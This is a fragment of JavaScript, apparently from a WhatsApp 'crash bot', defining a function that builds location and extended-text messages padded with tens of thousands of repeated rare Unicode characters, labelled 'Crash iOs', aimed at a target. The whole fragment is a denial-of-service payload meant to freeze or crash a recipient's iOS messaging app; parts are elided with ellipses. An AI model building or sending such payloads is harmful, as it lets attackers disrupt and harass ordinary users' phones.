...
async function iosinVis(sock, target)
   try {
      let locationMessage = {
         ...
         jpegThumbnail: null,
         name: "sock XS" + "𑆿".repeat(15000),
         address: "sock XS" + "𑆿".repeat(5000),
         url: `https://api-sock.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      ...
      let extendMsg = {
         extendedTextMessage: {
            text: "sock - XS",
            matchedText: "sock Clever",
            description: "sock - tzy".repeat(15000),
            title: "sock XS" + "Crash iOs ?".repeat(15000),
            previewType: "NONE",
